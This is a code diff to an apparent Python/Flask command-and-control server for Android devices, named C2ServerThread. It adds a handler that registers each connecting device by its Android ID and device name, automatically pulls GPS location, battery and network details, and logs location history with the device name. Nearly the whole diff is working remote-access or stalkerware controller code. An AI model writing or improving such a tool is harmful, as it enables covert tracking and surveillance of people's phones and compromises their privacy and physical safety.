@@ -201,38 +201,8 @@ class C2ServerThread(threading.Thread):
                 try:
                     client, addr = server_socket.accept()
                     client_counter += 1
-                    client_id = f"client_{client_counter}"
                     
-                    clients[client_id] = {
-                        'socket': client,
-                        'addr': addr,
-                        'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                        'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                        'sys_info': '',
-                        'battery': '',
-                        'network_info': '',
-                        'lock': threading.Lock()
-                    }
-
-                    print(f"[*] Connection received from {addr[0]}:{addr[1]}")
-                    socketio.emit('client_connected', {
-                        'client_id': client_id,
-                        'ip': addr[0],
-                        'port': addr[1],
-                        'connected_at': clients[client_id]['connected_at'],
-                        'sys_info': '',
-                        'battery': '',
-                        'network_info': ''
-                    }, namespace='/')
-
-                    # Auto-query sys_info to identify the client
-                    threading.Thread(target=query_client_sysinfo, args=(client_id,), daemon=True).start()
-                    
-                    # Auto-query location to immediately get GPS coordinates
-                    threading.Thread(target=query_client_location, args=(client_id,), daemon=True).start()
-                    
-                    # Auto-query battery and network info
-                    threading.Thread(target=query_client_battery_and_network, args=(client_id,), daemon=True).start()
+                    threading.Thread(target=handle_new_connection, args=(client, addr, client_counter), daemon=True).start()
                     
                 except socket.timeout:
                     continue
@@ -547,6 +517,68 @@ def screenshare():
     """Screen share page"""
     return render_template('screenshare.html')
 
+
+def handle_new_connection(client, addr, counter):
+    """Handle the initial handshake to get Android ID before registering fully."""
+    temp_id = f"temp_{counter}"
+    # Temporary registration for send_command_to_client to work
+    clients[temp_id] = {
+        'socket': client,
+        'addr': addr,
+        'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        'sys_info': '',
+        'battery': '',
+        'network_info': '',
+        'lock': threading.Lock()
+    }
+    
+    print(f"[*] Connection initiated from {addr[0]}:{addr[1]}, waiting for sys_info...")
+    time.sleep(0.5)
+    result = send_command_to_client(temp_id, 'sys_info')
+    
+    android_id = f"client_{counter}"
+    device_name = ""
+    
+    if result.get('success'):
+        sys_info_out = result['response'].strip()
+        try:
+            sys_data = json.loads(sys_info_out)
+            android_id = sys_data.get('android_id', android_id)
+            device_name = sys_data.get('device_name', '')
+        except:
+            device_name = sys_info_out
+            
+    # Pop temp client and register under android_id
+    if temp_id in clients:
+        client_data = clients.pop(temp_id)
+        
+        # If this android_id is already connected, disconnect old socket
+        if android_id in clients:
+            try:
+                clients[android_id]['socket'].close()
+            except:
+                pass
+            
+        client_data['sys_info'] = device_name
+        clients[android_id] = client_data
+        
+        print(f"[*] Device Registered | ID: {android_id} | Name: {device_name}")
+        socketio.emit('client_connected', {
+            'client_id': android_id,
+            'ip': addr[0],
+            'port': addr[1],
+            'connected_at': client_data['connected_at'],
+            'sys_info': device_name,
+            'battery': '',
+            'network_info': ''
+        }, namespace='/')
+
+        # Start standard background queries for newly registered client
+        threading.Thread(target=query_client_location, args=(android_id,), daemon=True).start()
+        threading.Thread(target=query_client_battery_and_network, args=(android_id,), daemon=True).start()
+
+
 def query_client_sysinfo(client_id):
     """Send sys_info command to a newly connected client and store the result"""
     time.sleep(0.5)  # Brief delay to let the client settle
@@ -630,9 +662,11 @@ def query_client_battery_and_network(client_id):
 def log_location_history(client_id, lat, lng, details):
     """Log a location update to the history file"""
     try:
+        device_name = clients.get(client_id, {}).get('sys_info', '')
         log_entry = {
             'timestamp': datetime.now().isoformat(),
             'client_id': client_id,
+            'device_name': device_name,
             'lat': lat,
             'lng': lng,
             'details': details
